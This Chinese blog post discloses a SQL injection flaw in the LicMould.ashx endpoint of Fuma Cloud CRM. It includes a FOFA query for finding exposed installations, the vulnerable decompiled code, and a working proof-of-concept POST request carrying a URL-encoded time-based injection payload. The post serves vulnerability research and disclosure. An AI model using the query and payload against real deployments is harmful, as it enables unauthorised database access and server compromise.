---
title: "孚盟云CRM LicMould.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-LicMould-sqli.html
asset_dir: assets/孚盟云crm-licmould.ashx-sql注入漏洞
---

# 孚盟云CRM LicMould.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/3 11:37
* 658浏览
* [0评论](#comment)
* 11分钟阅读

深入探索

app

服务器

CRM


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云LicMould.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 LicMould.ashx 对应的dll文件 FumaCRM\_BS.NewWeb.dll 里有关 LicMould 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str1 = context.Request["action"];
  if (!string.op_Equality(str1, "DeleteEmp"))
  {
  if (!string.op_Equality(str1, "TreeLoad"))
  {
    if (!string.op_Equality(str1, "Details"))
    {
    ...
```

深入探索

网页浏览器

恶意软件分析工具

技术文章订阅

当 **action=DeleteEmp** 时，处理逻辑如下

SQL注入防护

```
string str7 = context.Request["fuids"];
    string SQLString = $"delete from syLicMouldEmp where MouldKey={context.Request["key"]} and FUID in({$"'{str7.Substring(0, str7.Length - 1).Replace(",", "','")}'"})";
```

未经过滤或参数化绑定的参数 **key** 和 **fuids** 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

其他当 **action=Details**时，也存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-001-5a98ba3eec8c.webp)](https://image.mrxn.net/4b2410721dfa4f7dbf1fe1b4886bb8af.webp)

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-002-d135368d44ad.webp)](https://image.mrxn.net/87e82a96afa84759a6a84822c9ca51af.webp)

整体执行逻辑如下

代码安全审计

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-003-dbfc4719caec.webp)](https://image.mrxn.net/3620f4118630499e9328a83216737401.webp)

# 漏洞复现

```
POST /Ajax/LicMould.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=DeleteEmp&key=%31%20%77%61%69%74%66%6f%72%20%44%45%6c%61%59%27%30%3a%30%3a%34%27%2d%2d&fuids=1
```

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-004-d445ec6eb020.webp)](https://image.mrxn.net/2d014c7939fb43beb1a94d75d2a43d00.webp)

成功延时 4 秒

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM LicMould.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-LicMould-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-LicMould-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-LicMould-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-LicMould-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 